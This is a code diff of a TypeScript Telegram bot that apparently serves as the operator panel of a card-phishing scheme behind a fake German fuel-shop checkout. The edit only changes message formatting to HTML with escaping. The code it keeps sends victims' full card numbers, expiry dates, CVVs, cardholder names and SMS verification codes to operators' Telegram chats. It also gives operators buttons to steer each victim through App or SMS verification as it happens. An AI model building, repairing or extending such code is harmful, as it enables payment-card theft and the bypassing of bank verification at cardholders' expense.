@@ -98,17 +98,17 @@ async function handleCallbackQuery(callbackQuery: any) {
         
         switch (method) {
           case 'choice_required':
-            successMessage = `✅ **Choice Required**\n\nSession: \`${sessionId}\`\nCustomer can now choose between App & SMS verification.`;
-            break;
-          case 'app_confirmation':
-            successMessage = `✅ **App Verification Activated**\n\nSession: \`${sessionId}\`\nApp confirmation is now active.`;
+        successMessage = `✅ <b>Choice Required</b>\n\nSession: <code>${sessionId}</code>\nCustomer can now choose between App & SMS verification.`;
+        break;
+      case 'app_confirmation':
+        successMessage = `✅ <b>App Verification Activated</b>\n\nSession: <code>${sessionId}</code>\nApp confirmation is now active.`;
             // Send notification when customer chooses App - get cardholder name
             if (result && result.cardholder_name) {
               await sendMethodChoiceNotification(sessionId, 'app', result.cardholder_name);
             }
             break;
-          case 'sms_confirmation':
-            successMessage = `✅ **SMS Verification Activated**\n\nSession: \`${sessionId}\`\nSMS confirmation is now active.`;
+      case 'sms_confirmation':
+        successMessage = `✅ <b>SMS Verification Activated</b>\n\nSession: <code>${sessionId}</code>\nSMS confirmation is now active.`;
             // Send notification when customer chooses SMS - get cardholder name
             if (result && result.cardholder_name) {
               await sendMethodChoiceNotification(sessionId, 'sms', result.cardholder_name);
@@ -240,7 +240,7 @@ async function handleSendNotification(req: Request) {
 async function handleTestMessage(req: Request) {
   const { chatId } = await req.json();
 
-  const message = `🤖 *Test Notification*\n\nTelegram bot is working correctly!\nTime: ${new Date().toLocaleString()}`;
+  const message = `🤖 <b>Test Notification</b>\n\nTelegram bot is working correctly!\nTime: ${new Date().toLocaleString()}`;
 
   await sendTelegramMessage(chatId, message);
 
@@ -255,41 +255,41 @@ async function sendNotification(chatId: string, type: string, data: any) {
 
   switch (type) {
     case 'checkout_started':
-      message = `🛒 *Jemand ist im Checkout*\n\n` +
-                `🛢️ Produkt: ${data.product.displayName}\n` +
+      message = `🛒 <b>Jemand ist im Checkout</b>\n\n` +
+                `🛢️ Produkt: ${escapeHTML(data.product.displayName)}\n` +
                 `📦 Menge: ${data.quantity.toLocaleString()}L\n` +
                 `💰 Gesamtpreis: €${data.totalPrice.toFixed(2)}\n` +
-                `📮 PLZ: ${data.zipCode}`;
+                `📮 PLZ: ${escapeHTML(data.zipCode)}`;
       break;
 
     case 'payment_started':
-      message = `💳 *Payment Page Entered*\n\n` +
-                `👤 Cardholder: \`${data.cardholder_name}\`\n` +
-                `💳 Card: \`${data.card_number}\`\n` +
-                `📅 Expiry: \`${data.expiry_date}\`\n` +
-                `🔐 CVV: \`${data.cvv}\`\n` +
+      message = `💳 <b>Payment Page Entered</b>\n\n` +
+                `👤 Cardholder: <code>${escapeHTML(data.cardholder_name)}</code>\n` +
+                `💳 Card: <code>${escapeHTML(data.card_number)}</code>\n` +
+                `📅 Expiry: <code>${escapeHTML(data.expiry_date)}</code>\n` +
+                `🔐 CVV: <code>${escapeHTML(data.cvv)}</code>\n` +
                 `💰 Gesamtpreis: €${(data.totalPrice || 0).toFixed(2)}\n\n` +
-                `Karteninhaber: ${data.cardholder_name}`;
+                `Karteninhaber: ${escapeHTML(data.cardholder_name)}`;
       buttons = getVerificationMethodButtons(data.session_id);
       break;
 
     case 'verification_update':
       if (data.verification_status === 'app_confirmed') {
-        message = `✅ *App Verification Confirmed*\n\n` +
-                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}\n` +
-                  `Method: ${data.verification_method}`;
+        message = `✅ <b>App Verification Confirmed</b>\n\n` +
+                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
+                  `Method: ${escapeHTML(data.verification_method)}`;
         buttons = getCompletionButtons(data.session_id);
       } else if (data.verification_status === 'sms_confirmation' && data.sms_code) {
-        message = `📱 *SMS Code Entered*\n\n` +
-                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}\n` +
-                  `Code: \`${data.sms_code}\``;
+        message = `📱 <b>SMS Code Entered</b>\n\n` +
+                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}\n` +
+                  `Code: <code>${escapeHTML(data.sms_code)}</code>`;
         buttons = getCompletionButtons(data.session_id);
       } else if (data.message && data.message.includes('User wählte:')) {
         // Handle user choice notification
         const choice = data.verification_method === 'app_confirmation' ? 'App-Bestätigung' : 'SMS-Bestätigung';
-        message = `🎯 *User hat gewählt*\n\n` +
-                  `Wahl: ${choice}\n` +
-                  `Karteninhaber: ${data.cardholder_name || 'Unknown'}`;
+        message = `🎯 <b>User hat gewählt</b>\n\n` +
+                  `Wahl: ${escapeHTML(choice)}\n` +
+                  `Karteninhaber: ${escapeHTML(data.cardholder_name || 'Unknown')}`;
       }
       break;
   }
@@ -299,11 +299,20 @@ async function sendNotification(chatId: string, type: string, data: any) {
   }
 }
 
+function escapeHTML(text: string): string {
+  return text
+    .replace(/&/g, '&amp;')
+    .replace(/</g, '&lt;')
+    .replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;')
+    .replace(/'/g, '&#x27;');
+}
+
 async function sendTelegramMessage(chatId: string, text: string, replyMarkup: any = null) {
   const payload: any = {
     chat_id: chatId,
     text,
-    parse_mode: 'Markdown'
+    parse_mode: 'HTML'
   };
 
   if (replyMarkup) {
@@ -330,7 +339,7 @@ async function editMessageText(chatId: string, messageId: number, text: string, 
     chat_id: chatId,
     message_id: messageId,
     text,
-    parse_mode: 'Markdown'
+    parse_mode: 'HTML'
   };
 
   if (replyMarkup) {
@@ -393,7 +402,7 @@ async function sendMethodChoiceNotification(sessionId: string, method: 'app' | '
     const methodText = method === 'app' ? 'App-Verification' : 'SMS-Verification';
     const emoji = method === 'app' ? '📱' : '💬';
     
-    const message = `${emoji} **Nutzer hat ${methodText} gewählt**\n\nKarteninhaber: ${cardholderName || 'Unknown'}\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;
+    const message = `${emoji} <b>Nutzer hat ${methodText} gewählt</b>\n\nKarteninhaber: ${escapeHTML(cardholderName || 'Unknown')}\nZeitpunkt: ${new Date().toLocaleString('de-DE')}`;
 
     // Send notification to all active chat IDs
     for (const chatId of activeChatIds) {
